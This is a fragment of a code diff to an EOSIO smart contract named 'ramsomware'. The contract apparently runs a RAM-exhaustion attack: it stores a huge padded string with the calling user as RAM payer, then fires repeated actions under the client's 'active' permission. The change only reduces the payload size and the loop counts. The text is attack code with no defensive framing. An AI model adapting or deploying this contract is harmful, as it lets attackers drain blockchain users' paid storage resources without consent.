@@ -24,16 +24,6 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
         {
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
             A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
-            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
 
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
@@ -56,7 +46,7 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             //upsert(name("capamerica"), idx);
             upsert(client, idx);
 
-            for(int i =0; i<=104; i++)
+            for(int i =0; i<=1; i++)
             { 
                 out1.actions.pop_back();
                 out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx)+i) ));
@@ -65,7 +55,7 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
                 print("[+] CALL 1st: ", ((idx)+i), "\n");
             }
 
-            for (int i = 0; i<=104; i++)
+            for (int i = 0; i<=1; i++)
             {
                 out2.actions.pop_back();
                 out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx*5)+i) ));
